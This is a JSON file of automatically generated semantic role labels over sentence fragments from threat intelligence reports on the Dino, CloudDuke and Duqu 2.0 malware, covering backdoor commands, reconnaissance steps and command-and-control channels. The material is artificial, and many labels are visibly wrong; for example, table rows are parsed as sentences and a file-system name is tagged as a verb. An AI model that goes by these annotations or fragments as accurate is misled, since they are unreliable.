"V": {"text": "spins", "index": 12}, "ARGM-PRD": {"text": "off"}, "ARG1": {"text": "a CommLoop thread for the connection and returns to waiting for new connections from clients to appear"}}, "waiting": {"V": {"text": "waiting", "index": 23}, "ARG2": {"text": "for new connections from clients to appear"}}, "appear": {"ARG1": {"text": "new connections from clients"}, "V": {"text": "appear", "index": 30}}}, " The mainLoop function\nbegins by loading the unique infection ID for the victim\u2019s machine from the registry (under the\nkey value located at HKLM\\SOFTWARE\\Microsoft\\Rpc\\Security)": {"begins": {"ARG1": {"text": "The mainLoop function"}, "V": {"text": "begins", "index": 3}, "ARGM-MNR": {"text": "by loading the unique infection ID for the victim \u2019s machine from the registry ( under the key value located at HKLM\\SOFTWARE\\Microsoft\\Rpc\\Security )"}}, "loading": {"ARG0": {"text": "The mainLoop function"}, "V": {"text": "loading", "index": 5}, "ARG1": {"text": "the unique infection ID for the victim \u2019s machine"}, "ARG2": {"text": "from the registry ( under the key value located at HKLM\\SOFTWARE\\Microsoft\\Rpc\\Security )"}}, "located": {"ARG1": {"text": "the key value"}, "V": {"text": "located", "index": 23}, "ARGM-LOC": {"text": "at HKLM\\SOFTWARE\\Microsoft\\Rpc\\Security )"}}}, " After selecting the port, the server\nvariant will wait for incoming connections and instruct the driver to redirect appropriate TCP\nsessions to the listening port": {"selecting": {"V": {"text": "selecting", "index": 1}, "ARG1": {"text": "the port"}, "ARG0": {"text": "the server variant"}}, "will": {"V": {"text": "will", "index": 8}}, "wait": {"ARGM-TMP": {"text": "After selecting the port"}, "ARG1": {"text": "the server variant"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "wait", "index": 9}, "ARG2": {"text": "for incoming connections and instruct the driver to redirect appropriate TCP sessions to the listening port"}}, "instruct": {"ARGM-TMP": {"text": "After selecting the port"}, "ARG0": {"text": "the server variant"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "instruct", "index": 14}, "ARG1": {"text": "the driver"}, "ARGM-PRP": {"text": "to redirect appropriate TCP sessions to the listening port"}}, "redirect": {"ARG0": {"text": "the server variant"}, "V": {"text": "redirect", "index": 18}, "ARG1": {"text": "appropriate TCP sessions"}, "ARG2": {"text": "to the listening port"}}}, " The check for access rights effectively checks to see if the server variant\nprocess is running under the NT Authority": {"checks": {"ARG1": {"text": "The check for access rights"}, "ARGM-MNR": {"text": "effectively"}, "V": {"text": "checks", "index": 6}, "ARGM-PRP": {"text": "to see if the server variant process is running under the NT Authority"}}, "see": {"V": {"text": "see", "index": 8}, "ARG1": {"text": "if the server variant process is running under the NT Authority"}}, "is": {"V": {"text": "is", "index": 14}}, "running": {"ARG1": {"text": "the server variant process"}, "V": {"text": "running", "index": 15}, "ARGM-MNR": {"text": "under the NT Authority"}}}, "\n</list>\n\n\n<heading> Commands </heading>\n\nSeveral\u00a0commands\u00a0can\u00a0be\u00a0executed\u00a0in": {"can": {"V": {"text": "can", "index": 2}}, "be": {"V": {"text": "be", "index": 3}}, "executed": {"ARG1": {"text": "Several commands"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "executed", "index": 4}}}, "\n\n\nHence,\u00a0ramFS\u00a0serves": {"ramFS": {"ARGM-DIS": {"text": "Hence"}, "V": {"text": "ramFS", "index": 2}, "ARG1": {"text": "serves"}}}, "\n<figure></figure> <caption> \f                                                    Figure\u00a02 </caption>\n\n\n\n\nThe\u00a0cleaner\u00a0file\u00a0contains\u00a0the\u00a0string\u00a0\u201cINSTALL\u00a0\u00adA\u00a0\u201cwusvcd\u201d\u00a0\u00adU\u201d\u00a0which,\u00a0once\u00a0executed,\u00a0will\u00a0uninstall\u00a0the\u00a0malware\nfrom": {"contains": {"ARG0": {"text": "The cleaner file"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "the string \u201c INSTALL \u00adA \u201c wusvcd \u201d \u00adU \u201d which , once executed , will uninstall the malware from"}}, "executed": {"ARG1": {"text": "which"}, "ARGM-TMP": {"text": "once"}, "V": {"text": "executed", "index": 17}}, "will": {"R-ARG0": {"text": "which"}, "V": {"text": "will", "index": 19}, "ARG1": {"text": "uninstall the malware from"}}, "uninstall": {"ARG0": {"text": "\u201c wusvcd \u201d \u00adU \u201d"}, "R-ARG0": {"text": "which"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "uninstall", "index": 20}, "ARG1": {"text": "the malware"}, "ARG2": {"text": "from"}}}, "\n\n<table>\n  Command                                  Meaning\n                      Change\u00a0the\u00a0current\u00a0work\u00a0directory\u00a0on\u00a0the\u00a0real\u00a0file\n       CD\n                                          system\n      MD               N/A:\u00a0the\u00a0command\u00a0is\u00a0actually\u00a0not\u00a0implemented\n                      Installation\u00a0or\u00a0de\u00adinstallation\u00a0of\u00a0Dino,\u00a0in\u00a0Windows\n   INSTALL\n                                  registry\u00a0and/or\u00a0as\u00a0a\u00a0service\n   EXTRACT            Extracts\u00a0a\u00a0file\u00a0stored\u00a0in\u00a0ramFS\u00a0onto\u00a0the\u00a0machine\n    DELETE                  Deletes\u00a0a\u00a0file\u00a0stored\u00a0on\u00a0the\u00a0machine\n     EXEC                      Executes\u00a0a\u00a0file\u00a0stored\u00a0in\u00a0ramFS\n    INJECT          Injects\u00a0a\u00a0file\u00a0stored\u00a0in\u00a0ramFS\u00a0into\u00a0a\u00a0running\u00a0process\n    SLEEP                     Sleeps\u00a0for\u00a0a\u00a0given\u00a0amount\u00a0of\u00a0time\n      KILL                      Terminates\u00a0a\u00a0running\u00a0process\n   AUTODEL             N/A:\u00a0the\u00a0command\u00a0is\u00a0actually\u00a0not\u00a0implemented\n</table>\n\n<heading> Usage\u00a0of\u00a0ramFS\u00a0in\u00a0Dino </heading>\n\nIn\u00a0the\u00a0case\u00a0of\u00a0Dino,\u00a0ramFS\u00a0serves\u00a0as\u00a0protected\u00a0storage\u00a0for\u00a0one\u00a0specific\u00a0file\u00a0containing\u00a0the\u00a0instructions\u00a0to\nremove": {"ramFS": {"ARGM-LOC": {"text": "In the case of Dino"}, "V": {"text": "ramFS", "index": 6}, "ARG1": {"text": "serves"}, "ARGM-PRD": {"text": "as protected storage"}, "ARGM-PRP": {"text": "for one specific file containing the instructions to remove"}}, "protected": {"V": {"text": "protected", "index": 9}, "ARG1": {"text": "storage"}}, "containing": {"ARG0": {"text": "one specific file"}, "V": {"text": "containing", "index": 15}, "ARG1": {"text": "the instructions to remove"}}, "remove": {"V": {"text": "remove", "index": 19}}}, "\n<figure></figure> <caption> \f                                                       Figure\u00a01 </caption>\n\n\n\n\nFinally,\u00a0DataStore\u00a0objects\u00a0can\u00a0be\u00a0serialized\u00a0in\u00a0a\u00a0custom\u00a0format,\u00a0which\u00a0begins\u00a0with\u00a0the\u00a0magic\u00a0word\u00a0\u201cDxSx\u201d.\u00a0This\nis\u00a0used\u00a0in\u00a0particular\u00a0by\u00a0the\u00a0PSM\u00a0module\u00a0to\u00a0save": {"objects": {"ARG0": {"text": "DataStore"}, "V": {"text": "objects", "index": 3}}, "can": {"V": {"text": "can", "index": 4}}, "be": {"ARG1": {"text": "DataStore objects"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 5}, "ARG2": {"text": "serialized in a custom format , which begins with the magic word \u201c DxSx \u201d"}}, "serialized": {"ARG1": {"text": "DataStore objects"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "serialized", "index": 6}, "ARG2": {"text": "in a custom format/ which begins with the magic word \u201c DxSx \u201d"}}, "begins": {"ARG1": {"text": "a custom format"}, "R-ARG1": {"text": "which"}, "V": {"text": "begins", "index": 13}, "ARG2": {"text": "with the magic word \u201c DxSx \u201d"}}, "is": {"V": {"text": "is", "index": 23}}, "used": {"ARG1": {"text": "This"}, "V": {"text": "used", "index": 24}, "ARGM-ADV": {"text": "in particular"}, "ARG0": {"text": "by the PSM module to save"}}, "save": {"V": {"text": "save", "index": 32}}}, "\n</section>\n\n<section>\n<heading> Introduction </heading>\n\nThe\u00a0sample\u00a0of\u00a0Dino\u00a0documented\u00a0in\u00a0this\u00a0blog\u00a0post\u00a0was\u00a0used\u00a0in\u00a02013\u00a0against\u00a0targets\u00a0in\u00a0Iran.\u00a0The\u00a0original\u00a0means\nof\u00a0infection\u00a0is\u00a0unknown,\u00a0though\u00a0we\u00a0believe\u00a0Dino\u00a0was\u00a0installed\u00a0by\u00a0another\u00a0program,\u00a0as\u00a0it\u00a0contains\u00a0an\nuninstallation\u00a0command\u00a0without\u00a0the\u00a0corresponding\u00a0installation\u00a0procedure.\u00a0Given\u00a0the\u00a0set\u00a0of\u00a0commands\u00a0it\u00a0can\nreceive,": {"documented": {"V": {"text": "documented", "index": 4}, "ARGM-LOC": {"text": "in this blog post"}}, "was": {"V": {"text": "was", "index": 9}}, "used": {"ARG1": {"text": "The sample of Dino documented in this blog post"}, "V": {"text": "used", "index": 10}, "ARG2": {"text": "in 2013 against targets in Iran"}}, "is": {"ARG1": {"text": "The original means of infection"}, "V": {"text": "is", "index": 23}, "ARG2": {"text": "unknown"}, "ARGM-ADV": {"text": "though we believe Dino was installed by another program , as it contains an uninstallation command without the corresponding installation procedure . Given the set of commands it can receive"}}, "believe": {"ARG0": {"text": "we"}, "V": {"text": "believe", "index": 28}, "ARG1": {"text": "Dino was installed by another program , as it contains an uninstallation command without the corresponding installation procedure . Given the set of commands it can receive"}}, "was_2": {"V": {"text": "was", "index": 30}}, "installed": {"ARG1": {"text": "Dino"}, "V": {"text": "installed", "index": 31}, "ARG0": {"text": "by another program"}, "ARGM-ADV": {"text": "as it contains an uninstallation command without the corresponding installation procedure/ Given the set of commands it can receive"}}, "contains": {"ARG0": {"text": "it"}, "V": {"text": "contains", "index": 38}, "ARG1": {"text": "an uninstallation command"}, "ARGM-MNR": {"text": "without the corresponding installation procedure/ Given the set of commands it can receive"}}, "Given": {"ARG2": {"text": "the corresponding installation procedure"}, "V": {"text": "Given", "index": 48}, "ARG1": {"text": "the set of commands it can receive"}}, "can": {"V": {"text": "can", "index": 54}}, "receive": {"ARG1": {"text": "the set of commands"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "receive", "index": 55}}}, "\n</section>\n\n<section>\n<heading> Attribution </heading>\n\n<heading> Dino\u00a0Belongs\u00a0To\u00a0The\u00a0Farm </heading>\n\nThe\u00a0amount\u00a0of\u00a0shared\u00a0code\u00a0between\u00a0Dino\u00a0and\u00a0known\u00a0Animal\u00a0Farm\u00a0malware\u00a0leaves\u00a0very\u00a0little\u00a0doubt\u00a0that\u00a0Dino\nbelongs\u00a0to\u00a0Animal\u00a0Farm\u2019s\u00a0arsenal.\u00a0Among\u00a0these\u00a0shared\u00a0features,\u00a0we\u00a0can\u00a0cite\u00a0the\u00a0following:\n\n\n   At\u00a0the\u00a0very\u00a0beginning\u00a0of\u00a0Dino\u00a0execution,": {"shared": {"V": {"text": "shared", "index": 3}, "ARG1": {"text": "code"}}, "known": {"V": {"text": "known", "index": 8}, "ARG1": {"text": "Animal Farm malware leaves"}}, "leaves": {"ARG0": {"text": "The amount of shared code between Dino and known Animal Farm malware"}, "V": {"text": "leaves", "index": 12}, "ARG1": {"text": "very little doubt that Dino belongs to Animal Farm \u2019s arsenal"}}, "belongs": {"ARG0": {"text": "The amount of shared code between Dino and known Animal Farm malware leaves very little doubt"}, "R-ARG0": {"text": "that"}, "V": {"text": "belongs", "index": 18}, "ARG1": {"text": "to Animal Farm \u2019s arsenal"}}, "shared_2": {"V": {"text": "shared", "index": 27}}, "can": {"V": {"text": "can", "index": 31}}, "cite": {"ARGM-LOC": {"text": "Among these shared features"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "cite", "index": 32}, "ARG1": {"text": "the following"}}, "following": {"V": {"text": "following", "index": 34}}}, "\n\n\n   \u201cComServer\u201d:\u00a0These\u00a0keys": {}, "\n\n\nAt\u00a0startup\u00a0Dino\u00a0executes\u00a0successively\u00a0the\u00a0commands\u00a0stored\u00a0in\u00a0the\u00a0\u201cInitialCommands\u201d\u00a0field\u00a0in\u00a0its\u00a0configuration\u037e\nin\u00a0the\u00a0sample\u00a0we\u00a0analyzed\u00a0they\u00a0are:\n\n\n<list>\nsysinfo\ncominfos\n!ipconfig\u00a0/all\n!ipconfig\u00a0/displaydns\n!tracert\u00a0www.google.com\n</list>\n\n\nThose\u00a0commands\u00a0serve\u00a0as\u00a0a\u00a0reconnaissance\u00a0step\u00a0for\u00a0the\u00a0operators.\u00a0Their\u00a0execution\u00a0is\u00a0managed\u00a0by\u00a0the\nCMDEXEC\u00a0module,\u00a0the\u00a0commands\u00a0being\u00a0stored\u00a0in\u00a0a\u00a0queue\u00a0inside\u00a0the\u00a0CMDEXECQ\u00a0module.\u00a0The\u00a0result\u00a0is\nreported\u00a0to": {"executes": {"ARG0": {"text": "At startup Dino"}, "V": {"text": "executes", "index": 3}, "ARGM-MNR": {"text": "successively"}, "ARG1": {"text": "the commands stored in the \u201c InitialCommands \u201d field in its configuration\u037e in the sample"}}, "stored": {"ARG1": {"text": "the commands"}, "V": {"text": "stored", "index": 7}, "ARGM-LOC": {"text": "in the \u201c InitialCommands \u201d field in its configuration\u037e in the sample"}}, "analyzed": {"ARG0": {"text": "we"}, "V": {"text": "analyzed", "index": 21}, "ARG1": {"text": "they are"}}, "are": {"ARG1": {"text": "they"}, "V": {"text": "are", "index": 23}}, "serve": {"ARG0": {"text": "Those commands"}, "V": {"text": "serve", "index": 27}, "ARG1": {"text": "as a reconnaissance step for the operators . Their execution is managed by the CMDEXEC module , the commands being stored in a queue inside the CMDEXECQ module"}}, "is": {"V": {"text": "is", "index": 38}}, "managed": {"ARG1": {"text": "Their execution"}, "V": {"text": "managed", "index": 39}, "ARG0": {"text": "by the CMDEXEC module"}}, "being": {"V": {"text": "being", "index": 47}}, "stored_2": {"ARG1": {"text": "the commands"}, "V": {"text": "stored", "index": 48}, "ARGM-LOC": {"text": "in a queue inside the CMDEXECQ module"}}, "is_2": {"V": {"text": "is", "index": 59}}, "reported": {"ARG1": {"text": "The result"}, "V": {"text": "reported", "index": 60}}}, "\n\n\nRoughly,\u00a0Dino\u00a0can\u00a0be\u00a0described\u00a0as\u00a0an\u00a0elaborate\u00a0backdoor\u00a0built\u00a0in\u00a0a\u00a0modular\u00a0fashion.\u00a0Among\u00a0its\u00a0technical\ninnovations,\u00a0there\u00a0is\u00a0a\u00a0custom\u00a0file\u00a0system\u00a0to\u00a0execute\u00a0commands\u00a0in": {"can": {"V": {"text": "can", "index": 3}}, "be": {"V": {"text": "be", "index": 4}}, "described": {"ARG1": {"text": "Dino"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "described", "index": 5}, "ARG2": {"text": "as an elaborate backdoor built in a modular fashion"}}, "built": {"ARG1": {"text": "an elaborate backdoor"}, "V": {"text": "built", "index": 10}, "ARGM-MNR": {"text": "in a modular fashion"}}, "is": {"ARGM-LOC": {"text": "Among its technical innovations"}, "V": {"text": "is", "index": 22}, "ARG1": {"text": "a custom file system to execute commands in"}}, "execute": {"V": {"text": "execute", "index": 28}, "ARG1": {"text": "commands"}}}, "\n   archive              Create\u00a0an\u00a0archive\u00a0from\u00a0given\u00a0file\u00a0paths\n  unarchive              Unpack\u00a0an\u00a0archive\u00a0to\u00a0a\u00a0given\u00a0location\n                 Schedule\u00a0a\u00a0file\u00a0transfer\u00a0to\u00a0the\u00a0C&C\u00a0using\u00a0the\u00a0FMGR\n  download\n                                        module\n                Remove\u00a0the\u00a0next\u00a0file\u00a0transfer\u00a0scheduled\u00a0in\u00a0the\u00a0FMGR\n   cancel\n                                       module\n  cancelall    Remove\u00a0all\u00a0scheduled\u00a0file\u00a0transfers\u00a0in\u00a0the\u00a0FMGR\u00a0module\n               Schedule\u00a0a\u00a0command\u00a0to\u00a0be\u00a0executed\u00a0at\u00a0a\u00a0certain\u00a0time\u00a0by\n   cronadd       the\u00a0CRONTAB\u00a0module\u00a0(see\u00a0CRONTAB\u00a0description\n                                below\u00a0for\u00a0details)\n   cronlist        List\u00a0registered\u00a0entries\u00a0in\u00a0the\u00a0CRONTAB\u00a0module\n   crondel            Remove\u00a0an\u00a0entry\u00a0in\u00a0the\u00a0CRONTAB\u00a0module\n                  Schedule\u00a0a\u00a0wake\u00adup\u00a0of\u00a0the\u00a0malware\u00a0after\u00a0a\u00a0certain\n   wakeup\n                    amount\u00a0of\u00a0time\u00a0using\u00a0the\u00a0CRONTAB\u00a0module\n    restart         N/A:\u00a0the\u00a0command\u00a0is\u00a0actually\u00a0not\u00a0implemented\n   showip            Display\u00a0the\u00a0public\u00a0IP\u00a0of\u00a0the\u00a0infected\u00a0machine\n  cominfos     Display\u00a0information\u00a0about\u00a0the\u00a0currently\u00a0used\u00a0C&C\u00a0server\n comallinfos      Display\u00a0information\u00a0about\u00a0all\u00a0known\u00a0C&C\u00a0servers\n               Download\u00a0a\u00a0file\u00a0from\u00a0the\u00a0currently\u00a0used\u00a0C&C\u00a0server\u00a0onto\n    wget\n                                     the\u00a0machine\n   delayttk     Delay\u00a0the\u00a0de\u00adinstallation\u00a0of\u00a0the\u00a0malware,\u00a0if\u00a0scheduled\n</table>\n\n\fOne\u00a0command\u00a0of\u00a0particular\u00a0interest\u00a0is\u00a0\u201csearch\u201d,\u00a0which\u00a0allows\u00a0the\u00a0operators\u00a0to\u00a0look\u00a0for": {"Create": {"ARGM-MNR": {"text": "archive"}, "V": {"text": "Create", "index": 1}, "ARG1": {"text": "an archive"}, "ARG3": {"text": "from given file paths unarchive Unpack an archive to a given location Schedule/ FMGR"}}, "given": {"V": {"text": "given", "index": 5}, "ARGM-PRD": {"text": "paths unarchive Unpack"}, "ARG1": {"text": "an archive to a given location Schedule a file transfer to the C&C using the FMGR Display"}}, "given_2": {"V": {"text": "given", "index": 14}, "ARG1": {"text": "location Schedule/ a file transfer"}}, "using": {"V": {"text": "using", "index": 23}, "ARG1": {"text": "the FMGR download module Remove the next file"}}, "scheduled": {"ARG1": {"text": "the next file transfer"}, "V": {"text": "scheduled", "index": 33}, "ARGM-LOC": {"text": "in the FMGR cancel module cancelall/ delayttk"}, "ARG3": {"text": "Delay the de\u00adinstallation of the"}}, "cancel": {"ARG0": {"text": "the FMGR"}, "V": {"text": "cancel", "index": 37}, "ARG1": {"text": "module cancelall Remove Delay"}}, "Remove": {"ARG0": {"text": "the next file transfer"}, "V": {"text": "Remove", "index": 40}, "ARG1": {"text": "all scheduled file transfers in the FMGR module Schedule"}}, "scheduled_2": {"V": {"text": "scheduled", "index": 42}, "ARG1": {"text": "file transfers"}}, "be": {"V": {"text": "be", "index": 53}}, "executed": {"ARG1": {"text": "a command"}, "V": {"text": "executed", "index": 54}, "ARGM-TMP": {"text": "at a certain time"}, "ARG0": {"text": "by cronadd the CRONTAB module ( see CRONTAB description below for details ) cronlist List registered entries module crondel"}, "ARGM-LOC": {"text": "in the CRONTAB/ Remove an entry in the CRONTAB module Schedule"}}, "see": {"ARG0": {"text": "("}, "V": {"text": "see", "index": 65}}, "registered": {"V": {"text": "registered", "index": 74}, "ARG1": {"text": "entries"}}, "Remove_2": {"V": {"text": "Remove", "index": 81}, "ARG1": {"text": "an entry in the CRONTAB module Schedule a wake\u00adup of the malware"}}, "using_2": {"ARG0": {"text": "a certain wakeup amount of time"}, "V": {"text": "using", "index": 101}, "ARG1": {"text": "the CRONTAB module restart N / A"}}, "is": {"V": {"text": "is", "index": 112}}, "implemented": {"ARGM-ADV": {"text": "actually"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "implemented", "index": 115}, "ARGM-PRD": {"text": "showip"}, "ARG1": {"text": "the public IP of the infected machine cominfos Display information"}}, "Display": {"V": {"text": "Display", "index": 117}, "ARG1": {"text": "the public IP of the infected machine cominfos Display information about the currently used C&C server comallinfos Display information about all known C&C servers Download a file from the currently used C&C server onto wget the machine delayttk"}}, "used": {"ARG0": {"text": "the"}, "ARGM-TMP": {"text": "currently"}, "V": {"text": "used", "index": 131}, "ARG1": {"text": "C&C server comallinfos"}}, "known": {"V": {"text": "known", "index": 139}, "ARG1": {"text": "C&C servers"}}, "used_2": {"ARG1": {"text": "the"}, "ARGM-TMP": {"text": "currently"}, "V": {"text": "used", "index": 148}, "ARGM-MNR": {"text": "C&C server"}, "ARG2": {"text": "onto wget the machine delayttk/ the de\u00adinstallation of the malware"}}, "server": {"ARG0": {"text": "a file/ the currently used C&C"}, "V": {"text": "server", "index": 150}, "ARG1": {"text": "onto wget the machine delayttk Delay the de\u00adinstallation of the malware"}}, "scheduled_3": {"V": {"text": "scheduled", "index": 164}, "ARG3": {"text": "One command of particular interest"}}, "is_2": {"ARG1": {"text": "scheduled One command of particular interest"}, "V": {"text": "is", "index": 170}, "ARG2": {"text": "\u201c search \u201d"}}, "allows": {"ARG0": {"text": "scheduled One command of particular interest is \u201c search \u201d"}, "R-ARG0": {"text": "which"}, "V": {"text": "allows", "index": 176}, "ARG1": {"text": "the operators to look for"}}, "look": {"ARG0": {"text": "the operators"}, "V": {"text": "look", "index": 180}, "ARG1": {"text": "for"}}}, "\n\n\nRoughly,": {}, "\n</section>\n\n<section>\n<heading> RamFS:\u00a0A\u00a0Temporary\u00a0File\u00a0System </heading>\n\nDino\u00a0contains": {"contains": {"ARG0": {"text": "Dino"}, "V": {"text": "contains", "index": 1}}}, "\n\n\n   \u201cBD_Keys\u201d\u00a0and\u00a0\u201cCC_Keys\u201d\u00a0contain\u00a0cryptographic\u00a0keys\u00a0to": {"contain": {"V": {"text": "contain", "index": 7}, "ARG1": {"text": "cryptographic keys to"}}}, "\n</section>\n\n<section>\n<heading> Tasks\u00a0scheduling\u00a0in\u00a0a\u00a0Unix\u00a0fashion </heading>\n\nThe\u00a0commands\u00a0\u201ccronadd\u201d,\u00a0\u201ccronlist\u201d\u00a0and\u00a0\u201ccrondel\u201d\u00a0serve\u00a0respectively\u00a0to\u00a0add,\u00a0list,\u00a0and\u00a0remove": {"cronadd": {"V": {"text": "cronadd", "index": 3}, "ARG1": {"text": "\u201d"}}, "serve": {"ARG0": {"text": "\u201c cronlist \u201d and \u201c crondel \u201d"}, "V": {"text": "serve", "index": 13}, "ARGM-ADV": {"text": "respectively"}, "ARG1": {"text": "to add , list , and remove"}}, "add": {"ARGM-ADV": {"text": "respectively"}, "V": {"text": "add", "index": 16}}, "list": {"ARG1": {"text": "crondel"}, "V": {"text": "list", "index": 18}}, "remove": {"V": {"text": "remove", "index": 21}}}, " If successful, OneDriveSolution will then proceed\nto copy data from the victim's computer to the OneDrive account": {"will": {"ARG1": {"text": "OneDriveSolution"}, "V": {"text": "will", "index": 4}}, "proceed": {"ARGM-ADV": {"text": "If successful"}, "ARG0": {"text": "OneDriveSolution"}, "ARGM-MOD": {"text": "will"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "proceed", "index": 6}, "ARG1": {"text": "to copy data from the victim 's computer to the OneDrive"}}, "copy": {"ARG0": {"text": "OneDriveSolution"}, "V": {"text": "copy", "index": 8}, "ARG1": {"text": "data from the victim 's computer"}, "ARG2": {"text": "to the OneDrive"}}}, " The purpose of the downloader is to download and execute additional malware on the\nvictim's system": {"is": {"ARG1": {"text": "The purpose of the downloader"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "to download and execute additional malware on the victim 's system"}}, "download": {"V": {"text": "download", "index": 7}, "ARG1": {"text": "additional malware"}, "ARG2": {"text": "on the victim 's system"}}, "execute": {"V": {"text": "execute", "index": 9}, "ARG1": {"text": "additional malware on the victim 's system"}}}, " This second component, internally called\n\"OneDriveSolution\", is especially interesting because it relies on Microsoft's cloud storage service\nOneDrive as its command and control channel": {"called": {"ARG1": {"text": "This second component"}, "ARGM-MNR": {"text": "internally"}, "V": {"text": "called", "index": 5}, "ARG2": {"text": "\" OneDriveSolution \""}}, "is": {"ARG1": {"text": "This second component , internally called \" OneDriveSolution \""}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "especially interesting"}, "ARGM-CAU": {"text": "because it relies on Microsoft 's cloud storage service OneDrive as its command and control channel"}}, "relies": {"ARG0": {"text": "it"}, "V": {"text": "relies", "index": 15}, "ARG1": {"text": "on Microsoft 's cloud storage service OneDrive as its command and control channel"}}}, " In most cases,\nexecuting these executables will have resulted in two additional files being written to the victim's hard\ndisk": {"executing": {"V": {"text": "executing", "index": 4}, "ARG0": {"text": "these executables"}}, "will": {"V": {"text": "will", "index": 7}}, "have": {"V": {"text": "have", "index": 8}}, "resulted": {"ARGM-LOC": {"text": "In most cases"}, "ARG1": {"text": "executing these executables"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "resulted", "index": 9}, "ARG2": {"text": "in two additional files being written to the victim 's hard disk"}}, "being": {"V": {"text": "being", "index": 14}}, "written": {"ARG1": {"text": "two additional files"}, "V": {"text": "written", "index": 15}, "ARG2": {"text": "to the victim 's hard disk"}}}, " </caption>\n\n\nAll of the CloudDuke \"solutions\" use the same loader, a piece of code whose primary purpose is to decrypt\nthe embedded, encrypted solution, load it in memory and execute it": {"use": {"ARG0": {"text": "All of the CloudDuke \" solutions \""}, "V": {"text": "use", "index": 7}, "ARG1": {"text": "the same loader , a piece of code whose primary purpose is to decrypt the embedded/ encrypted solution"}}, "is": {"R-ARG1": {"text": "a piece of code"}, "ARG1": {"text": "whose primary purpose"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "to decrypt the embedded"}}, "decrypt": {"V": {"text": "decrypt", "index": 21}, "ARG1": {"text": "the embedded"}}, "embedded": {"V": {"text": "embedded", "index": 23}}, "encrypted": {"V": {"text": "encrypted", "index": 25}, "ARG1": {"text": "solution"}}, "load": {"V": {"text": "load", "index": 28}, "ARG2": {"text": "it/ in memory"}}, "execute": {"ARGM-PRD": {"text": "encrypted solution"}, "V": {"text": "execute", "index": 33}, "ARG1": {"text": "it"}}}, " In most observed cases, the downloader will attempt to connect to a compromised\nwebsite to download an encrypted malicious payload which the downloader will decrypt and execute": {"observed": {"V": {"text": "observed", "index": 2}, "ARG1": {"text": "cases"}}, "will": {"ARGM-LOC": {"text": "In most observed cases"}, "V": {"text": "will", "index": 7}, "ARG1": {"text": "attempt"}}, "attempt": {"ARGM-LOC": {"text": "In most observed cases"}, "ARG0": {"text": "the downloader"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "attempt", "index": 8}, "ARG1": {"text": "to connect to a compromised website to download an encrypted malicious payload which the downloader will decrypt and execute"}}, "connect": {"ARG0": {"text": "the downloader"}, "V": {"text": "connect", "index": 10}, "ARG1": {"text": "to a compromised website"}, "ARGM-PRP": {"text": "to download an encrypted malicious payload which the downloader will decrypt and execute"}}, "compromised": {"V": {"text": "compromised", "index": 13}, "ARG1": {"text": "website"}}, "download": {"ARG0": {"text": "the downloader"}, "V": {"text": "download", "index": 16}, "ARG1": {"text": "an encrypted malicious payload which the downloader will decrypt and execute"}}, "encrypted": {"V": {"text": "encrypted", "index": 18}, "ARG1": {"text": "malicious payload"}}, "will_2": {"ARG1": {"text": "an"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "the downloader"}, "V": {"text": "will", "index": 24}}, "decrypt": {"ARG1": {"text": "an encrypted malicious payload"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "the downloader"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "decrypt", "index": 25}}, "execute": {"ARG1": {"text": "an encrypted malicious payload"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "the downloader"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "execute", "index": 27}}}, " It will also search the OneDrive account\nfor files containing commands for the malware to execute": {"will": {"ARGM-MOD": {"text": "will"}, "ARGM-DIS": {"text": "also"}, "ARG2": {"text": "search"}, "ARG1": {"text": "the OneDrive account for files containing commands for the malware to execute"}}, "search": {"ARG0": {"text": "It"}, "ARGM-MOD": {"text": "will"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "search", "index": 3}, "ARG1": {"text": "the OneDrive account for files containing commands for the malware to execute"}}, "containing": {"ARG0": {"text": "files"}, "V": {"text": "containing", "index": 9}, "ARG1": {"text": "commands for the malware to execute"}}, "execute": {"V": {"text": "execute", "index": 15}}}, " Detection based on communications </heading>\n\nThe malware can transmit information through HTTP traffic": {"based": {"ARG1": {"text": "Detection"}, "V": {"text": "based", "index": 1}, "ARG2": {"text": "on communications The malware"}}, "can": {"V": {"text": "can", "index": 6}}, "transmit": {"ARG0": {"text": "Detection/ The malware"}, "ARGM-ADV": {"text": "based on communications"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "transmit", "index": 7}, "ARG1": {"text": "information"}, "ARG2": {"text": "through HTTP traffic"}}}, " String decryption </heading>\n\nSome of the strings in Duqu 2.0 are obfuscated by XOR-based encryption": {"are": {"ARG1": {"text": "String decryption Some of the strings in Duqu 2.0"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "obfuscated by XOR - based encryption"}}, "obfuscated": {"ARG1": {"text": "String decryption Some of the strings in Duqu 2.0"}, "V": {"text": "obfuscated", "index": 10}, "ARG0": {"text": "by XOR - based encryption"}}, "based": {"ARG2": {"text": "XOR"}, "V": {"text": "based", "index": 14}, "ARG1": {"text": "encryption"}}}, " AES encryption of the configuration file </heading>\n\nThe analyzed main module of Duqu 2.0 and also the old Duqu sample reads configuration\ninformation from a special file": {"analyzed": {"V": {"text": "analyzed", "index": 7}, "ARG1": {"text": "main module"}}, "reads": {"ARG0": {"text": "AES encryption of the configuration file The analyzed main module of Duqu 2.0 and also the old Duqu sample"}, "V": {"text": "reads", "index": 19}, "ARG1": {"text": "configuration information"}, "ARG3": {"text": "from a special file"}}}, " These proxies can act as HTTP or HTTPS servers": {"can": {"V": {"text": "can", "index": 2}}, "act": {"ARG0": {"text": "These proxies"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "act", "index": 3}, 